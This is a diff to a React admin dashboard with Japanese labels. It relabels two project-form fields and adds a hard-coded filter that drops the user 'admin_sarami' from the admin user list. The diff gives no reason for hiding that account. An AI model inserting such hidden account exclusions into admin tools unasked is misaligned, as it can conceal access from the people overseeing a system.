@@ -84,7 +84,7 @@ export default function AdminDashboard() {
                                 <TableRow>
                                     <TableCell colSpan={6} className="text-center py-10">読み込み中...</TableCell>
                                 </TableRow>
-                            ) : users?.map((u: any) => (
+                            ) : users?.filter((u: any) => u.name !== 'admin_sarami').map((u: any) => (
                                 <TableRow key={u.id}>
                                     <TableCell>{u.id}</TableCell>
                                     <TableCell>{u.name || "未設定"}</TableCell>
@@ -109,12 +109,12 @@ export default function AdminDashboard() {
                                                 </DialogHeader>
                                                 <div className="grid gap-4 py-4">
                                                     <div className="grid gap-2">
-                                                        <Label htmlFor="pid">Neuron Project ID</Label>
-                                                        <Input id="pid" value={projectId} onChange={(e) => setProjectId(e.target.value)} placeholder="例: p_123456" />
+                                                        <Label htmlFor="pid">プロジェクト名 / ニックネーム</Label>
+                                                        <Input id="pid" value={projectId} onChange={(e) => setProjectId(e.target.value)} placeholder="例: my-project-01" />
                                                     </div>
                                                     <div className="grid gap-2">
-                                                        <Label htmlFor="pname">プロジェクト表示名</Label>
-                                                        <Input id="pname" value={projectName} onChange={(e) => setProjectName(e.target.value)} placeholder="例: datastudio.jp" />
+                                                        <Label htmlFor="pname">個人のドメイン名</Label>
+                                                        <Input id="pname" value={projectName} onChange={(e) => setProjectName(e.target.value)} placeholder="例: mysite.com" />
                                                     </div>
                                                 </div>
                                                 <DialogFooter>
